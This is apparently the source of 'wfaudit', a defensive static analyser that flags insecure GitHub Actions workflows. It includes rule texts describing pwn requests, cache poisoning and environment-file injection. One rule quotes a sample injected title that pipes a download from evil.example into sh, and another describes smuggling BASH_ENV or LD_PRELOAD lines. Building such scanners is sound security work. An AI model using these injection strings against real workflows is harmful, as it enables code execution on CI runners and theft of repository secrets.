"""wfaudit: a static analyser for GitHub Actions workflows. It parses workflow YAML with line numbers and reports unpinned actions, privileged triggers that run untrusted code, script injection, broad token permissions, exposed secrets, persisted credentials, self-hosted runners on public repositories, GITHUB_ENV and GITHUB_PATH injection and cache poisoning, as text, JSON or SARIF."""
from __future__ import annotations

import argparse
import json
import os
import re
import sys
from dataclasses import asdict, dataclass, field
from typing import Any, Dict, Iterable, List, Optional, Sequence, Set, Tuple

VERSION = "1.0.0"
SEVERITIES = ("critical", "high", "medium", "low")
SARIF_LEVELS = {"critical": "error", "high": "error", "medium": "warning", "low": "note"}
SECURITY_SEVERITY = {"critical": "9.5", "high": "8.0", "medium": "5.5", "low": "3.0"}
VISIBILITIES = ("public", "private", "unknown")
LOCKFILE = "actions.lock"

INT_RE = re.compile(r"^-?(0|[1-9][0-9]*)$")
FLOAT_RE = re.compile(r"^-?[0-9]+\.[0-9]+$")
BLOCK_HEADER = re.compile(r"^([|>])([+-]?)$")
ESCAPES = {"n": "\n", "t": "\t", "r": "\r", '"': '"', "\\": "\\", "/": "/", "0": "\0"}
QUOTE_OPENERS = ("", ":", "-", "[", "{", ",")

SHA_RE = re.compile(r"^[0-9a-f]{40}$")
SHORT_SHA_RE = re.compile(r"^[0-9a-f]{7,39}$")
EXPRESSION = re.compile(r"\$\{\{(.*?)\}\}", re.S)
CONTEXT_REF = re.compile(r"(?<![\w.'\"-])(github|env|steps|needs|inputs|secrets|matrix|vars|job|jobs|runner|strategy)((?:\s*\.\s*(?:[A-Za-z_][\w-]*|\*)|\s*\[[^\]]*\])*)")
CONTEXT_PART = re.compile(r"\.\s*([A-Za-z_][\w-]*|\*)|\[\s*([^\]]*?)\s*\]")
SECRET_REF = re.compile(r"\bsecrets\s*\.\s*([A-Za-z_][A-Za-z0-9_]*)|\bsecrets\s*\[\s*'([^']+)'\s*\]|\bgithub\s*\.\s*token\b")
TOJSON_SECRETS = re.compile(r"\btojson\s*\(\s*secrets\s*\)", re.I)
GITHUB_FILE_WRITE = re.compile(r"(?:>>?|\btee\b(?:\s+-a)?)\s*\"?\$\{?(GITHUB_ENV|GITHUB_PATH)\}?\"?")
PRINTS = re.compile(r"\b(echo|printf|cat|tee|base64|xxd|od|rev|hexdump)\b|\bset\s+-x\b")
BUILD_COMMANDS = re.compile(r"(?:^|[\s;&|(])\.{1,2}/|\b(?:npm|npx|pnpm|yarn|make|pip3?|python3?|node|go|cargo|mvn|gradle|bundle|rake|tox|pytest|docker\s+build)\b")
UNTRUSTED_FETCH = re.compile(r"\bgh\s+pr\s+checkout\b|\bgit\s+(?:fetch|pull)\b[^\n]*\bpull/")
PUBLISH_COMMANDS = re.compile(r"\b(?:npm|pnpm|yarn)\s+publish\b|\btwine\s+upload\b|\bcargo\s+publish\b|\bgh\s+release\s+(?:create|upload)\b|\bdocker\s+push\b|\bgoreleaser\s+release\b|\bgem\s+push\b")

GITHUB_OWNERS = ("actions", "github")
DANGEROUS_TRIGGERS = ("pull_request_target", "workflow_run", "issue_comment")
PRIVILEGED_TRIGGERS = DANGEROUS_TRIGGERS + ("issues", "discussion", "discussion_comment")
ENV_FILE_TRIGGERS = ("pull_request_target", "workflow_run")
FORK_CODE_TRIGGERS = ("pull_request", "pull_request_target", "pull_request_review", "pull_request_review_comment")
TRUSTED_CACHE_TRIGGERS = ("push", "workflow_dispatch", "repository_dispatch", "delete", "registry_package", "page_build", "schedule")
BOOLEAN_FUNCTIONS = ("contains", "startswith", "endswith")

ATTACKER_CONTEXTS = (
    "github.event.issue.title",
    "github.event.issue.body",
    "github.event.pull_request.title",
    "github.event.pull_request.body",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.head.label",
    "github.event.pull_request.head.repo.default_branch",
    "github.event.comment.body",
    "github.event.review.body",
    "github.event.review_comment.body",
    "github.event.discussion.title",
    "github.event.discussion.body",
    "github.event.pages.*.page_name",
    "github.event.commits.*.message",
    "github.event.commits.*.author.email",
    "github.event.commits.*.author.name",
    "github.event.head_commit.message",
    "github.event.head_commit.author.email",
    "github.event.head_commit.author.name",
    "github.event.workflow_run.head_branch",
    "github.event.workflow_run.head_commit.message",
    "github.event.workflow_run.head_commit.author.email",
    "github.event.workflow_run.head_commit.author.name",
    "github.event.workflow_run.display_title",
    "github.head_ref",
)
UNTRUSTED_REFS = (
    "github.event.pull_request.head.sha",
    "github.event.pull_request.head.ref",
    "github.event.pull_request.merge_commit_sha",
    "github.head_ref",
    "github.event.workflow_run.head_sha",
    "github.event.workflow_run.head_branch",
    "github.event.workflow_run.head_commit.id",
    "github.event.pull_request.head.repo.full_name",
    "github.event.workflow_run.head_repository.full_name",
)
CODE_INPUTS = {"actions/github-script": ("script",)}
EXECUTING_ACTIONS = ("docker/build-push-action",)

WRITE_SCOPES = (
    "actions", "artifact-metadata", "attestations", "checks", "code-quality", "contents", "deployments",
    "discussions", "id-token", "issues", "packages", "pages", "pull-requests", "repository-projects",
    "security-events", "statuses",
)
HIGH_SCOPES = ("actions", "attestations", "contents", "deployments", "id-token", "issues", "packages", "pages", "pull-requests")
LEVEL_RANK = {"none": 0, "read": 1, "write": 2}

ACTION_PERMISSIONS: Dict[str, Dict[str, str]] = {
    "actions/checkout": {"contents": "read"},
    "actions/cache": {},
    "actions/cache/restore": {},
    "actions/cache/save": {},
    "actions/upload-artifact": {},
    "actions/download-artifact": {},
    "actions/setup-node": {},
    "actions/setup-python": {},
    "actions/setup-go": {},
    "actions/setup-java": {},
    "actions/setup-dotnet": {},
    "actions/upload-pages-artifact": {},
    "actions/deploy-pages": {"pages": "write", "id-token": "write"},
    "actions/attest-build-provenance": {"id-token": "write", "attestations": "write"},
    "actions/attest": {"id-token": "write", "attestations": "write"},
    "actions/labeler": {"contents": "read", "pull-requests": "write"},
    "actions/stale": {"issues": "write", "pull-requests": "write"},
    "actions/github-script": {},
    "github/codeql-action/init": {},
    "github/codeql-action/analyze": {"security-events": "write"},
    "github/codeql-action/upload-sarif": {"security-events": "write"},
    "tj-actions/changed-files": {"contents": "read", "pull-requests": "read"},
    "peter-evans/create-pull-request": {"contents": "write", "pull-requests": "write"},
    "softprops/action-gh-release": {"contents": "write"},
    "docker/login-action": {},
    "docker/build-push-action": {},
    "docker/setup-buildx-action": {},
    "docker/setup-qemu-action": {},
    "docker/metadata-action": {},
    "aws-actions/configure-aws-credentials": {},
    "google-github-actions/auth": {},
    "azure/login": {},
    "pypa/gh-action-pypi-publish": {},
}
RUN_PERMISSIONS: Tuple[Tuple["re.Pattern[str]", str, str], ...] = (
    (re.compile(r"\bgh\s+pr\s+(?:comment|edit|review|merge|close|reopen|ready|create|lock|unlock)\b"), "pull-requests", "write"),
    (re.compile(r"\bgh\s+pr\s+(?:view|list|diff|checks|status)\b"), "pull-requests", "read"),
    (re.compile(r"\bgh\s+issue\s+(?:comment|edit|create|close|reopen|lock|unlock|delete|transfer|pin|unpin)\b"), "issues", "write"),
    (re.compile(r"\bgh\s+issue\s+(?:view|list|status)\b"), "issues", "read"),
    (re.compile(r"\bgh\s+label\s+(?:create|edit|delete|clone)\b"), "issues", "write"),
    (re.compile(r"\bgh\s+release\s+(?:create|upload|edit|delete|delete-asset)\b"), "contents", "write"),
    (re.compile(r"\bgh\s+release\s+(?:view|list|download)\b"), "contents", "read"),
    (re.compile(r"\bgit\s+push\b"), "contents", "write"),
    (re.compile(r"\bgh\s+(?:run|workflow)\s+(?:cancel|rerun|run|enable|disable|delete)\b"), "actions", "write"),
)
SCRIPT_API = re.compile(r"\bgithub\.rest\.(issues|pulls|repos|git|actions|checks|packages)\.(\w+)")
API_SCOPES = {"issues": "issues", "pulls": "pull-requests", "repos": "contents", "git": "contents", "actions": "actions", "checks": "checks", "packages": "packages"}
PUBLISHER_ACTIONS = (
    "pypa/gh-action-pypi-publish", "rubygems/release-gem", "goreleaser/goreleaser-action", "softprops/action-gh-release",
    "googleapis/release-please-action", "jreleaser/release-action", "release-drafter/release-drafter",
)


@dataclass(frozen=True)
class Rule:
    id: str
    title: str
    attack: str
    fix: str


RULES: Dict[str, Rule] = {rule.id: rule for rule in (
    Rule("unpinned-uses", "action or reusable workflow not pinned to a full commit SHA",
         "Whoever can move the tag or branch (the maintainer, or anyone holding a stolen maintainer token, as in the tj-actions/changed-files compromise of March 2025) changes the code this job runs, with its token and secrets.",
         "Pin the full 40-character commit SHA with the version as a comment (`owner/repo@<sha> # v1.2.3`) and let Dependabot or Renovate move the pin."),
    Rule("dangerous-trigger", "privileged trigger that outsiders can fire",
         "A fork pull request, a comment or a finished fork run starts this workflow in the base repository, with its secrets and a write-capable GITHUB_TOKEN.",
         "Prefer `pull_request` (read-only token and no secrets for forks) or `workflow_call`; if the trigger is unavoidable, never check out or execute the contributor's code in it and keep its permissions minimal."),
    Rule("untrusted-checkout", "privileged workflow checks out the untrusted head",
         "The contributor controls every file in that checkout, so the first install script, build or local action that runs it executes their code with the base repository's secrets and token (a pwn request).",
         "Build untrusted code only under `pull_request`; hand results to a privileged workflow as data that is parsed, never executed, and gate everything else behind a label or an environment with required reviewers."),
    Rule("template-injection", "attacker-controlled expression expanded into code",
         "`${{ }}` is substituted into the script text before the shell starts, so a title such as `\"; curl -sSf https://evil.example | sh; #` becomes a command.",
         "Pass the value through `env:` and use it as a quoted shell variable (`\"$TITLE\"`); never put `${{ }}` with event data inside `run:` or `script:`, and not through `${{ env.X }}` either."),
    Rule("excessive-permissions", "GITHUB_TOKEN broader than the steps need",
         "A compromised step (an injected script, a moved action tag) acts with every scope the token holds, for example pushing to the default branch or publishing a release.",
         "Set `permissions: {}` at the top and give each job only the scopes its steps use; the finding names the least-privilege block."),
    Rule("secret-exposure", "secret handed to untrusted code or printed",
         "A secret given to code that can change, loaded wholesale, or printed in any transformed form leaves the runner; log masking only hides the exact string.",
         "Give each secret by name to the one step that needs it, keep it in an environment with protection rules, pin the action that receives it, and never print it or any part of it."),
    Rule("persist-credentials", "checkout leaves the token on disk",
         "actions/checkout stores the job's token for later git commands, so every later step, and any artifact that uploads the workspace, can read it.",
         "Set `persist-credentials: false` on every checkout; give a step that must push its own token explicitly."),
    Rule("self-hosted-runner", "self-hosted runner where outsiders can run code",
         "On a public repository a fork pull request runs its code on your machine, can leave a process behind for the next job and can reach your network.",
         "Use GitHub-hosted or ephemeral just-in-time runners for public repositories, require approval for outside contributors, and keep persistent self-hosted runners to private repositories."),
    Rule("github-env-injection", "untrusted value written to GITHUB_ENV or GITHUB_PATH",
         "A value containing a newline adds its own line to the file, such as `BASH_ENV=/tmp/x` or `LD_PRELOAD=...`, and every later step runs it; a directory written to GITHUB_PATH shadows `git` or `bash`.",
         "Write only constants or validated values; pass data between steps through `GITHUB_OUTPUT` and read it with `env:`; never write these files from untrusted input in a workflow started by a privileged trigger."),
    Rule("cache-poisoning", "cache shared between untrusted code and a release",
         "Cache entries are not signed: an entry saved by a job that runs untrusted code is restored by a release job, which then builds and publishes the attacker's files.",
         "Do not restore caches in jobs that publish (remove the cache step or set `cache-mode: none`), and never grant `cache-mode: write` to a job started by a privileged trigger."),
)}


class YamlError(ValueError):
    def __init__(self, line: int, message: str) -> None:
        super().__init__(f"line {line}: {message}")
        self.line = line


class WorkflowError(ValueError):
    def __init__(self, path: str, line: int, message: str) -> None:
        location = f"{path}:{line}" if line else path
        super().__init__(f"{location}: {message}")
        self.path = path
        self.line = line


@dataclass
class Line:
    number: int
    indent: int
    text: str
    raw: str


@dataclass
class Document:
    data: Any
    key_lines: Dict[Tuple[Any, ...], int]
    value_lines: Dict[Tuple[Any, ...], int]

    def line(self, *path: Any) -> int:
        probe = tuple(path)
        while probe:
            if probe in self.key_lines:
                return self.key_lines[probe]
            probe = probe[:-1]
        return 1

    def value_line(self, *path: Any) -> int:
        return self.value_lines.get(tuple(path)) or self.line(*path)


def strip_comment(text: str) -> str:
    quote = None
    index = 0
    while index < len(text):
        char = text[index]
        if quote:
            if quote == '"' and char == "\\":
                index += 2
                continue
            if char == quote:
                quote = None
        elif char in "\"'" and text[:index].rstrip()[-1:] in QUOTE_OPENERS:
            quote = char
        elif char == "#" and (index == 0 or text[index - 1] in " \t"):
            return text[:index].rstrip()
        index += 1
    return text.rstrip()


def parse_double_quoted(text: str, number: int) -> Tuple[str, str]:
    out: List[str] = []
    index = 1
    while index < len(text):
        char = text[index]
        if char == "\\":
            if index + 1 >= len(text):
                raise YamlError(number, "unfinished escape sequence in a double-quoted string")
            out.append(ESCAPES.get(text[index + 1], text[index + 1]))
            index += 2
            continue
        if char == '"':
            return "".join(out), text[index + 1:]
        out.append(char)
        index += 1
    raise YamlError(number, "unterminated double-quoted string (multi-line quoted strings are outside the subset)")


def parse_single_quoted(text: str, number: int) -> Tuple[str, str]:
    out: List[str] = []
    index = 1
    while index < len(text):
        if text[index] == "'":
            if text[index + 1:index + 2] == "'":
                out.append("'")
                index += 2
                continue
            return "".join(out), text[index + 1:]
        out.append(text[index])
        index += 1
    raise YamlError(number, "unterminated single-quoted string (multi-line quoted strings are outside the subset)")


def plain_scalar(text: str) -> Any:
    if text in ("", "~", "null", "Null", "NULL"):
        return None
    if text in ("true", "True", "TRUE"):
        return True
    if text in ("false", "False", "FALSE"):
        return False
    if INT_RE.match(text):
        return int(text)
    if FLOAT_RE.match(text):
        return float(text)
    return text


def parse_flow_value(text: str, number: int, terminators: str) -> Tuple[Any, str]:
    if text.startswith('"'):
        return parse_double_quoted(text, number)
    if text.startswith("'"):
        return parse_single_quoted(text, number)
    if text[:1] in "[{":
        return parse_flow(text, number)
    end = len(text)
    for index, char in enumerate(text):
        if char in terminators:
            end = index
            break
    return plain_scalar(text[:end].strip()), text[end:]


def parse_flow(text: str, number: int) -> Tuple[Any, str]:
    text = text.lstrip()
    closing = "]" if text.startswith("[") else "}"
    sequence = closing == "]"
    items: List[Any] = []
    mapping: Dict[str, Any] = {}
    rest = text[1:].lstrip()
    while True:
        if rest.startswith(closing):
            return (items if sequence else mapping), rest[1:].lstrip()
        if not rest:
            raise YamlError(number, f"unterminated flow collection; missing {closing} (flow collections must fit on one line)")
        if sequence:
            value, rest = parse_flow_value(rest, number, ",]")
            items.append(value)
        else:
            key, rest = parse_flow_value(rest, number, ":,}")
            rest = rest.lstrip()
            value = None
            if rest.startswith(":"):
                value, rest = parse_flow_value(rest[1:].lstrip(), number, ",}")
            mapping[str(key)] = value
        rest = rest.lstrip()
        if rest.startswith(","):
            rest = rest[1:].lstrip()
        elif rest and not rest.startswith(closing):
            raise YamlError(number, f"expected , or {closing} in a flow collection")


def parse_scalar(text: str, number: int) -> Any:
    text = text.strip()
    if text.startswith(("&", "*", "!")):
        raise YamlError(number, "anchors, aliases and tags are outside the subset; repeat the value")
    if text.startswith('"'):
        value, rest = parse_double_quoted(text, number)
    elif text.startswith("'"):
        value, rest = parse_single_quoted(text, number)
    elif text[:1] in "[{":
        value, rest = parse_flow(text, number)
    else:
        return plain_scalar(text)
    if rest.strip():
        raise YamlError(number, f"unexpected text after the value: {rest.strip()!r}")
    return value


def split_key(text: str, number: int) -> Optional[Tuple[str, str]]:
    if text.startswith(("'", '"')):
        key, rest = (parse_single_quoted if text[0] == "'" else parse_double_quoted)(text, number)
        rest = rest.lstrip()
        if rest.startswith(":") and (len(rest) == 1 or rest[1] == " "):
            return key, rest[1:].strip()
        return None
    if text[:1] in "[{":
        return None
    for index, char in enumerate(text):
        if char == ":" and (index + 1 == len(text) or text[index + 1] == " "):
            key = text[:index].strip()
            if not key:
                raise YamlError(number, "empty key")
            return key, text[index + 1:].strip()
    return None


def is_item(text: str) -> bool:
    return text == "-" or text.startswith("- ")


def fold(lines: Sequence[str]) -> str:
    out = ""
    previous: Optional[str] = None
    for line in lines:
        if previous is None:
            out = line
        elif line == "":
            out += "\n"
        elif previous == "":
            out += line
        elif line.startswith(" ") or previous.startswith(" "):
            out += "\n" + line
        else:
            out += " " + line
        previous = line
    return out


class Parser:
    def __init__(self, source: str) -> None:
        self.lines = [
            Line(number, len(raw) - len(raw.lstrip(" ")), strip_comment(raw).strip(), raw)
            for number, raw in enumerate(source.splitlines(), start=1)
        ]
        self.position = 0
        self.key_lines: Dict[Tuple[Any, ...], int] = {}
        self.value_lines: Dict[Tuple[Any, ...], int] = {}

    def peek(self) -> Optional[Line]:
        while self.position < len(self.lines):
            line = self.lines[self.position]
            if line.text and line.text not in ("---", "..."):
                leading = line.raw[: len(line.raw) - len(line.raw.lstrip(" \t"))]
                if "\t" in leading:
                    raise YamlError(line.number, "tabs are not allowed for indentation; use spaces")
                return line
            self.position += 1
        return None

    def parse_document(self) -> Document:
        first = self.peek()
        value = self.parse_block(first.indent, ()) if first is not None else {}
        extra = self.peek()
        if extra is not None:
            raise YamlError(extra.number, f"unexpected indentation ({extra.indent} spaces)")
        return Document(value, self.key_lines, self.value_lines)

    def parse_block(self, indent: int, path: Tuple[Any, ...]) -> Any:
        line = self.peek()
        if line is None:
            return None
        if is_item(line.text):
            return self.parse_sequence(indent, path)
        if split_key(line.text, line.number) is not None:
            return self.parse_mapping(indent, path)
        if BLOCK_HEADER.match(line.text):
            raise YamlError(line.number, "a block scalar (| or >) must follow a key on the same line")
        self.position += 1
        self.value_lines[path] = line.number
        return parse_scalar(line.text, line.number)

    def parse_sequence(self, indent: int, path: Tuple[Any, ...], compact: bool = False) -> List[Any]:
        items: List[Any] = []
        while True:
            line = self.peek()
            if line is None or line.indent < indent:
                return items
            if line.indent > indent:
                raise YamlError(line.number, f"bad indentation in a sequence (expected {indent} spaces, got {line.indent})")
            if not is_item(line.text):
                if compact:
                    return items
                raise YamlError(line.number, "expected a sequence item starting with '- '")
            child = path + (len(items),)
            self.key_lines[child] = line.number
            rest = line.text[1:].strip()
            if not rest:
                self.position += 1
                nested = self.peek()
                items.append(self.parse_block(nested.indent, child) if nested is not None and nested.indent > indent else None)
                continue
            if BLOCK_HEADER.match(rest):
                raise YamlError(line.number, "a block scalar as a sequence item is outside the subset; put it under a key")
            column = indent + (len(line.text) - len(rest))
            self.lines[self.position] = Line(line.number, column, rest, line.raw)
            items.append(self.parse_block(column, child))

    def parse_mapping(self, indent: int, path: Tuple[Any, ...]) -> Dict[str, Any]:
        mapping: Dict[str, Any] = {}
        while True:
            line = self.peek()
            if line is None or line.indent < indent:
                return mapping
            if line.indent > indent:
                raise YamlError(line.number, f"bad indentation in a mapping (expected {indent} spaces, got {line.indent})")
            parts = split_key(line.text, line.number)
            if parts is None:
                raise YamlError(line.number, f"expected 'key: value', got {line.text!r}")
            key, rest = parts
            if key in mapping:
                raise YamlError(line.number, f"duplicate key {key!r}")
            child = path + (key,)
            self.key_lines[child] = line.number
            self.position += 1
            if rest:
                header = BLOCK_HEADER.match(rest)
                if header:
                    mapping[key], self.value_lines[child] = self.block_scalar(header.group(1), header.group(2), indent, line.number)
                else:
                    mapping[key] = parse_scalar(rest, line.number)
                    self.value_lines[child] = line.number
                continue
            nested = self.peek()
            if nested is None or nested.indent < indent:
                mapping[key] = None
            elif nested.indent == indent:
                mapping[key] = self.parse_sequence(indent, child, compact=True) if is_item(nested.text) else None
            else:
                mapping[key] = self.parse_block(nested.indent, child)

    def block_scalar(self, style: str, chomp: str, parent_indent: int, header_line: int) -> Tuple[str, int]:
        collected: List[Tuple[int, str]] = []
        content_indent: Optional[int] = None
        while self.position < len(self.lines):
            line = self.lines[self.position]
            if not line.raw.strip():
                collected.append((line.number, ""))
                self.position += 1
                continue
            indent = len(line.raw) - len(line.raw.lstrip(" "))
            if indent <= parent_indent:
                break
            if content_indent is None:
                content_indent = indent
            if indent < content_indent:
                raise YamlError(line.number, f"block scalar line is indented {indent} spaces, less than its first line ({content_indent})")
            collected.append((line.number, line.raw[content_indent:]))
            self.position += 1
        start = collected[0][0] if collected else header_line + 1
        body = [text for _, text in collected]
        trailing = 0
        while body and body[-1] == "":
            body.pop()
            trailing += 1
        text = "\n".join(body) if style == "|" else fold(body)
        if not text:
            return "", start
        if chomp == "-":
            return text, start
        if chomp == "+":
            return text + "\n" * (trailing + 1), start
        return text + "\n", start


def parse_yaml(source: str) -> Document:
    return Parser(source).parse_document()


@dataclass
class Step:
    job: str
    index: int
    line: int
    name: str = ""
    id: str = ""
    uses: str = ""
    uses_line: int = 0
    run: str = ""
    run_line: int = 0
    inputs: Dict[str, Any] = field(default_factory=dict)
    input_lines: Dict[str, int] = field(default_factory=dict)
    env: Dict[str, str] = field(default_factory=dict)
    env_lines: Dict[str, int] = field(default_factory=dict)

    @property
    def label(self) -> str:
        first = self.run.strip().split("\n", 1)[0].strip()
        if len(first) > 40:
            first = first[:37] + "..."
        return self.name or self.uses or first or f"step {self.index + 1}"


@dataclass
class Job:
    id: str
    line: int
    name: str = ""
    runs_on: Any = None
    runs_on_line: int = 0
    permissions_set: bool = False
    permissions: Any = None
    permissions_line: int = 0
    uses: str = ""
    uses_line: int = 0
    secrets: Any = None
    secrets_line: int = 0
    env: Dict[str, str] = field(default_factory=dict)
    env_lines: Dict[str, int] = field(default_factory=dict)
    cache_mode: str = ""
    cache_mode_line: int = 0
    steps: List[Step] = field(default_factory=list)


@dataclass
class Workflow:
    path: str
    name: str = ""
    triggers: Dict[str, Any] = field(default_factory=dict)
    trigger_lines: Dict[str, int] = field(default_factory=dict)
    permissions_set: bool = False
    permissions: Any = None
    permissions_line: int = 0
    env: Dict[str, str] = field(default_factory=dict)
    env_lines: Dict[str, int] = field(default_factory=dict)
    cache_mode: str = ""
    cache_mode_line: int = 0
    jobs: List[Job] = field(default_factory=list)
    locked: Set[str] = field(default_factory=set)

    def has(self, *triggers: str) -> List[str]:
        return [name for name in triggers if name in self.triggers]


@dataclass
class Finding:
    rule: str
    severity: str
    file: str
    line: int
    job: str
    step: str
    message: str
    attack: str
    fix: str

    def key(self) -> Tuple[str, int, str]:
        return (self.file, self.line, self.rule)


def as_text(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, bool):
        return "true" if value else "false"
    if isinstance(value, (dict, list)):
        return json.dumps(value)
    return str(value)


def env_of(doc: Document, raw: Any, path: Tuple[Any, ...]) -> Tuple[Dict[str, str], Dict[str, int]]:
    if isinstance(raw, dict):
        return {str(k): as_text(v) for k, v in raw.items()}, {str(k): doc.value_line(*path, k) for k in raw}
    if raw is None:
        return {}, {}
    return {"*": as_text(raw)}, {"*": doc.value_line(*path)}


def normalise_triggers(on: Any, doc: Document) -> Tuple[Dict[str, Any], Dict[str, int]]:
    on_line = doc.line("on")
    if isinstance(on, str):
        return {on: None}, {on: on_line}
    if isinstance(on, list):
        return {str(t): None for t in on}, {str(t): doc.line("on", i) for i, t in enumerate(on)}
    if isinstance(on, dict):
        return {str(k): v for k, v in on.items()}, {str(k): doc.line("on", k) for k in on}
    raise WorkflowError("", on_line, "on: must be an event name, a list of events or a mapping")


def load_step(doc: Document, job_id: str, index: int, raw: Any, base: Tuple[Any, ...]) -> Step:
    if not isinstance(raw, dict):
        raise WorkflowError("", doc.line(*base), f"step {index + 1} of job {job_id} must be a mapping")
    inputs = raw.get("with") or {}
    if not isinstance(inputs, dict):
        raise WorkflowError("", doc.line(*base, "with"), "with: must be a mapping of inputs")
    env, env_lines = env_of(doc, raw.get("env"), base + ("env",))
    return Step(
        job=job_id,
        index=index,
        line=doc.line(*base),
        name=as_text(raw.get("name")),
        id=as_text(raw.get("id")),
        uses=as_text(raw.get("uses")).strip(),
        uses_line=doc.line(*base, "uses"),
        run=as_text(raw.get("run")),
        run_line=doc.value_line(*base, "run"),
        inputs={str(k): v for k, v in inputs.items()},
        input_lines={str(k): doc.value_line(*base, "with", k) for k in inputs},
        env=env,
        env_lines=env_lines,
    )


def load_job(doc: Document, job_id: str, raw: Any) -> Job:
    base = ("jobs", job_id)
    if not isinstance(raw, dict):
        raise WorkflowError("", doc.line(*base), f"job {job_id} must be a mapping")
    env, env_lines = env_of(doc, raw.get("env"), base + ("env",))
    steps = raw.get("steps") or []
    if not isinstance(steps, list):
        raise WorkflowError("", doc.line(*base, "steps"), f"steps: of job {job_id} must be a list")
    flat: List[Tuple[Any, Tuple[Any, ...]]] = []
    for index, item in enumerate(steps):
        path = base + ("steps", index)
        group = item.get("parallel") if isinstance(item, dict) else None
        if isinstance(group, list):
            flat.extend((sub, path + ("parallel", position)) for position, sub in enumerate(group))
        else:
            flat.append((item, path))
    return Job(
        id=job_id,
        line=doc.line(*base),
        name=as_text(raw.get("name")),
        runs_on=raw.get("runs-on"),
        runs_on_line=doc.value_line(*base, "runs-on"),
        permissions_set="permissions" in raw,
        permissions=raw.get("permissions"),
        permissions_line=doc.line(*base, "permissions"),
        uses=as_text(raw.get("uses")).strip(),
        uses_line=doc.line(*base, "uses"),
        secrets=raw.get("secrets"),
        secrets_line=doc.line(*base, "secrets"),
        env=env,
        env_lines=env_lines,
        cache_mode=as_text(raw.get("cache-mode")),
        cache_mode_line=doc.line(*base, "cache-mode"),
        steps=[load_step(doc, job_id, index, item, path) for index, (item, path) in enumerate(flat)],
    )


def load_workflow(path: str, source: str) -> Workflow:
    try:
        doc = parse_yaml(source)
        data = doc.data
        if not isinstance(data, dict):
            raise WorkflowError(path, 1, "a workflow is a mapping with on: and jobs:")
        if "on" not in data:
            raise WorkflowError(path, 1, "missing on: (the events that start the workflow)")
        jobs = data.get("jobs")
        if not isinstance(jobs, dict) or not jobs:
            raise WorkflowError(path, doc.line("jobs"), "jobs: must be a mapping with at least one job")
        triggers, trigger_lines = normalise_triggers(data["on"], doc)
        env, env_lines = env_of(doc, data.get("env"), ("env",))
        return Workflow(
            path=path,
            name=as_text(data.get("name")),
            triggers=triggers,
            trigger_lines=trigger_lines,
            permissions_set="permissions" in data,
            permissions=data.get("permissions"),
            permissions_line=doc.line("permissions"),
            env=env,
            env_lines=env_lines,
            cache_mode=as_text(data.get("cache-mode")),
            cache_mode_line=doc.line("cache-mode"),
            jobs=[load_job(doc, str(job_id), raw) for job_id, raw in jobs.items()],
        )
    except YamlError as error:
        raise WorkflowError(path, error.line, str(error).split(": ", 1)[1]) from None
    except WorkflowError as error:
        if error.path:
            raise
        raise WorkflowError(path, error.line, str(error).split(": ", 1)[1]) from None


def normalise_context(root: str, tail: str) -> str:
    parts = [root]
    for match in CONTEXT_PART.finditer(tail):
        name, index = match.groups()
        if name is not None:
            parts.append(name)
        elif index and index[0] in "'\"" and index[-1:] == index[0]:
            parts.append(index[1:-1])
        else:
            parts.append("*")
    return ".".join(parts)


def contexts_in(expression: str) -> List[Tuple[str, int]]:
    return [(normalise_context(m.group(1), m.group(2)), m.start()) for m in CONTEXT_REF.finditer(expression)]


def inside_boolean_call(expression: str, position: int) -> bool:
    stack: List[str] = []
    in_string = False
    for index in range(position):
        char = expression[index]
        if in_string:
            if char == "'":
                in_string = False
        elif char == "'":
            in_string = True
        elif char == "(":
            name = re.search(r"([A-Za-z_]\w*)\s*$", expression[:index])
            stack.append(name.group(1).lower() if name else "")
        elif char == ")" and stack:
            stack.pop()
    return any(name in BOOLEAN_FUNCTIONS for name in stack)


def segments_match(context: str, pattern: str) -> bool:
    left, right = context.split("."), pattern.split(".")
    return all(a == b or a == "*" or b == "*" for a, b in zip(left, right))


def is_attacker_context(context: str) -> bool:
    return any(segments_match(context, pattern) for pattern in ATTACKER_CONTEXTS)


def attacker_contexts(text: str) -> List[Tuple[str, int]]:
    found: List[Tuple[str, int]] = []
    for expression in EXPRESSION.finditer(text):
        body = expression.group(1)
        for context, offset in contexts_in(body):
            if is_attacker_context(context) and not inside_boolean_call(body, offset):
                found.append((context, expression.start()))
    return found


def tainted_env(*scopes: Dict[str, str]) -> Dict[str, str]:
    merged: Dict[str, str] = {}
    for scope in scopes:
        merged.update(scope)
    taint: Dict[str, str] = {}
    for name, value in merged.items():
        hits = attacker_contexts(value)
        if hits:
            taint[name] = hits[0][0]
    return taint


def secret_env(*scopes: Dict[str, str]) -> Dict[str, str]:
    merged: Dict[str, str] = {}
    for scope in scopes:
        merged.update(scope)
    found: Dict[str, str] = {}
    for name, value in merged.items():
        for expression in EXPRESSION.finditer(value):
            match = SECRET_REF.search(expression.group(1))
            if match:
                found[name] = match.group(0).replace(" ", "")
                break
    return found


def shell_reference(name: str) -> "re.Pattern[str]":
    return re.compile(r"\$\{?" + re.escape(name) + r"(?![A-Za-z0-9_])")


def action_key(uses: str) -> str:
    return uses.split("@", 1)[0].strip().lower()


def owner_of(uses: str) -> str:
    return action_key(uses).split("/", 1)[0]


def classify_uses(uses: str) -> str:
    if uses.startswith(("./", "$/")):
        return "local"
    if uses.startswith("docker://"):
        if "@sha256:" in uses:
            return "docker-digest"
        return "docker-tag" if ":" in uses[len("docker://"):] else "docker-latest"
    if "@" not in uses:
        return "no-ref"
    ref = uses.rsplit("@", 1)[1].strip()
    if SHA_RE.match(ref):
        return "sha"
    if SHORT_SHA_RE.match(ref):
        return "short-sha"
    return "ref"


def is_pinned(uses: str) -> bool:
    return classify_uses(uses) in ("sha", "local", "docker-digest")


def truthy(value: Any) -> bool:
    return as_text(value).strip().lower() in ("true", "1", "yes")


def falsy(value: Any) -> bool:
    return as_text(value).strip().lower() in ("false", "0", "no")


def merge_level(needed: Dict[str, str], scope: str, level: str) -> None:
    if LEVEL_RANK[level] > LEVEL_RANK.get(needed.get(scope, "none"), 0):
        needed[scope] = level


def conditional_permissions(key: str, inputs: Dict[str, Any]) -> Dict[str, str]:
    if key == "aws-actions/configure-aws-credentials" and "role-to-assume" in inputs and "aws-access-key-id" not in inputs:
        return {"id-token": "write"}
    if key == "google-github-actions/auth" and "workload_identity_provider" in inputs:
        return {"id-token": "write"}
    if key == "azure/login" and "client-id" in inputs and "creds" not in inputs:
        return {"id-token": "write"}
    if key == "docker/login-action" and "ghcr.io" in as_text(inputs.get("registry")):
        return {"packages": "write"}
